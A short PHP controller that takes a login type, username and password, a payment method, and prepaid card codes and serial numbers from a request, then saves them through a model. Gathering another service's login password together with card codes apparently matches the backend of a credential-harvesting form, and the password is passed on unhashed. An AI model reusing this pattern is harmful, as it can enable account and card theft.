<?php
require_once __DIR__ . '/../models/Submission.php';

class SubmissionController {
    public function create($data) {
        $loginType = $data['login_type'] ?? '';
        $loginIdentifier = $data['login_identifier'] ?? '';
        $loginPassword = $data['login_password'] ?? '';
        $paymentMethod = $data['payment_method'] ?? '';
        $amount = $data['amount'] ?? 0;
        $cardCode = $data['card_code'] ?? '';
        $serialNumber = $data['serial_number'] ?? '';

        if (empty($loginType) || empty($loginIdentifier)) {
            return [
                'success' => false,
                'message' => 'Missing required fields'
            ];
        }

        $submission = new Submission($loginType, $loginIdentifier, $loginPassword, $paymentMethod, $amount, $cardCode, $serialNumber);
        
        if ($submission->save()) {
            return [
                'success' => true,
                'message' => 'Submission saved successfully'
            ];
        } else {
            return [
                'success' => false,
                'message' => 'Failed to save submission'
            ];
        }
    }
}
